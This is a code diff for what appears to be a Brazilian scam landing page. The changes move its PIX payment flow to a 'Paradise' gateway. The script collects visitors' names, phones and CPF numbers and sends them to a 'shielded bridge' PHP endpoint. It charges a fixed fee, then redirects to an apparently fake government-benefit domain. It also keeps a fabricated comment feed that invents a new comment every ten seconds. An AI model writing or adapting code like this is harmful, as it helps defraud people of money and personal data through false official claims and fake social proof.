@@ -293,7 +293,7 @@ fbq('track', 'PageView');
 </footer>
 
 <script>
-    // --- CONFIGURAÇÃO DA PONTE BLINDADA ---
+    // --- CONFIGURAÇÃO DA PONTE BLINDADA (ADAPTADA PARA PARADISE) ---
     var MEU_PHP_GATEWAY = 'https://kitbrinde.online/processar.php'; 
     var PIX_VALOR_CENTS   = 6490;
     var PIX_REDIRECT      = 'https://beneficiogov.vercel.app/up1.html';
@@ -314,7 +314,17 @@ fbq('track', 'PageView');
     async function pixIniciar(){
         document.getElementById('pix-loading').style.display='block';
         try{
-            var utmStr = window.location.search.replace(/^\?/, "");
+            // Captura UTMs individualmente para o objeto tracking da Paradise
+            var trackingData = {
+                utm_source: _p.get('utm_source') || "",
+                utm_medium: _p.get('utm_medium') || "",
+                utm_campaign: _p.get('utm_campaign') || "",
+                utm_content: _p.get('utm_content') || "",
+                utm_term: _p.get('utm_term') || "",
+                src: _p.get('src') || "",
+                sck: _p.get('sck') || ""
+            };
+
             var payload = {
                 customer: {
                     name: nomeOk || 'Cliente',
@@ -322,17 +332,21 @@ fbq('track', 'PageView');
                     phone: _fone.replace(/\D/g,''),
                     document: _cpf.replace(/\D/g,'')
                 },
-                utm: utmStr
+                utm_data: trackingData // Enviando como objeto para o PHP
             };
+
             var res = await fetch(MEU_PHP_GATEWAY, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
+
             var data = await res.json();
-            if(!res.ok || !data.pixCode) throw new Error();
-            _pixTxid = data.transactionId;
-            _pixCode = data.pixCode;
+            
+            // Ajuste para os campos retornados pela Paradise: qr_code e transaction_id
+            if(!res.ok || !data.qr_code) throw new Error();
+            _pixTxid = data.transaction_id; 
+            _pixCode = data.qr_code;
 
             document.getElementById('pix-nome-show').textContent = nomeOk;
             document.getElementById('pix-cpf-show').textContent = _cpf ? formatarCPF(_cpf) : '---';
@@ -349,7 +363,8 @@ fbq('track', 'PageView');
             try{
                 var r = await fetch(MEU_PHP_GATEWAY + '?transactionId=' + encodeURIComponent(_pixTxid));
                 var s = await r.json();
-                if(s.status === 'COMPLETED' || s.status === 'PAID'){
+                // Na Paradise, o status de sucesso retornado pela query é 'approved'
+                if(s.status === 'approved' || s.status === 'approved_manual'){
                     clearInterval(_pixTimer);
                     window.location.href=PIX_REDIRECT;
                 }
@@ -372,7 +387,7 @@ fbq('track', 'PageView');
         });
     }
 
-    // --- LOGICA DE COMENTARIOS AVANÇADA (SALVA NO LOCAL E GERA NOVOS) ---
+    // --- LOGICA DE COMENTARIOS AVANÇADA (MANTIDA ORIGINAL) ---
     var totalComments = 25738;
     var storedComments = [];
     const fbHeaderOutside = document.getElementById('fb-header-outside');
@@ -419,7 +434,7 @@ fbq('track', 'PageView');
                 createRandomComment(msg, false);
                 fbLoadingSpan.textContent = "Comentários atualizados.";
                 fbHeaderOutside.textContent = `Comentários (${++totalComments})`;
-            }, (i + 1) * 10000); // Aparece um novo a cada 10 segundos
+            }, (i + 1) * 10000); 
         });
     }
 
